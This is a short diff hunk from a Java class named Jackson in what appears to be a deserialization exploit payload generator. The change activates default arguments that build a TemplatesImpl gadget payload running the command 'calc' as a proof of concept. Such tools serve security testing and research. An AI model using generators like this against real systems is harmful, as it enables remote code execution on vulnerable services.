@@ -24,7 +24,7 @@ import java.lang.reflect.Proxy;
 public class Jackson implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        //args = new String[]{"TemplatesImpl:raw_cmd:calc"};
+        args = new String[]{"TemplatesImpl:raw_cmd:calc"};
         PayloadRunner.run(Jackson.class, args);
     }
 
